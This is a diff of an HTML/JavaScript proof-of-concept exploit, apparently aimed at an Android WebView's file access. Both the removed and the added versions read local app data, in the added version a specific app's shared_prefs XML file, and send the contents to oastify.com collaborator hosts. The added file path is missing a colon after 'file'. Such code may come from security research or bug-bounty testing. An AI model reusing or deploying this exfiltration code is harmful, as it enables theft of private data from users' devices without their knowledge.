@@ -1,33 +1,20 @@
-<html>
-  <head></head>
-  <body data-rsssl=1>
-    <script type="text/javascript">
-      function exfiltrateFile(filePath, callback) {
-        var request = new XMLHttpRequest();
-        request.open("GET", "file://" + filePath, true);
-        request.onload = function(event) {
-          callback(btoa(request.responseText));
-        }
-        request.onerror = function(event) {
-          document.write(event);
-          callback(null);
-        }
-        request.send();
+<script type="text/javascript">
+    function theftFile(path, callback) {
+      var req = new XMLHttpRequest();
+
+      req.open("GET", "file://" + path, true);
+      req.onload = function(e) {
+        callback(req.responseText);
       }
-      var filePath = "/data/data/";
-      exfiltrateFile(filePath, function(contents) {
-            document.write(contents);
-            var exfil = new XMLHttpRequest();
-            exfil.open("GET", "http://srnk3dd0yetjpuumd4klmo0p1g7lvdj2.oastify.com/?filedata=" + contents, true);
-              exfil.onload = function(event) {
-                document.write(" < /br>[+] File successfully exfiltrated to remote server");
-                }
-                exfil.onerror = function(event) {
-                  document.write(event);
-                  callback(null);
-                }
-                exfil.send();
-              });
-    </script>
-  </body>
-</html>
+      req.onerror = function(e) {
+        callback(null);
+      }
+      req.send();
+    }
+
+    var file = "file///data/data/com.oceanwing.FDMPrint/shared_prefs/eufy_policy_accept_table.xml";
+
+    theftFile(file, function(contents) {
+        location.href = "http://lazur24teepff6c4lfpghdm8ezkq8vwk.oastify.com/?data=" + encodeURIComponent(contents);
+    });
+</script>
